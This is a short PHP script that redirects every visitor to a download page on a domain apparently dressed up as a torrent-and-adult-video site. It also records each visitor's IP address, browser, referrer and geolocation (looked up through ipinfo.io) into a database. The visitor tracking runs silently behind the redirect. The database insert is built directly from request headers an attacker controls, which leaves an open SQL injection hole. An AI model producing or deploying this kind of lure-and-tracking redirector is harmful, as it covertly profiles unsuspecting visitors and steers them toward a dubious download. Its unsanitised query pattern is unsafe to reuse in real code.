<?php
header("Location: https://h-utorrent.com/xvideos.red/download/index.html");

?>


<?php
	ini_set('error_reporting', E_ALL);
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1); 


$host = 'localhost';  
$user = 'root';    
$pass = '';
$db_name = 'xred1';  
$link = mysqli_connect($host, $user, $pass, $db_name);


$browserandos = $_SERVER['HTTP_USER_AGENT']; 

if(isset($_SERVER['HTTP_REFERER'])){
$referalka = $_SERVER['HTTP_REFERER'];
}else{
$referalka = "No Ref";		
}
  
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
	$ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
	$ip = $_SERVER['REMOTE_ADDR']; 
} 

$ip = explode(",",$ip)[0];
if (!empty($ip)) {
   $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
   $hostname=gethostbyaddr($ip);
}
$date = date("Y-m-d H:i:s");
$detailscountry = $details->country;
$detailscity = $details->city;
$detailsregion = $details->region;
$detailsorg = $details->org;
 
$sql = mysqli_query($link, "INSERT INTO `users` (`refer`, `GEO`,  `uip`, `uagent`) VALUES ('{$referalka}', '{$detailscountry}', '{$ip}', '{$browserandos}')");


die();

?>
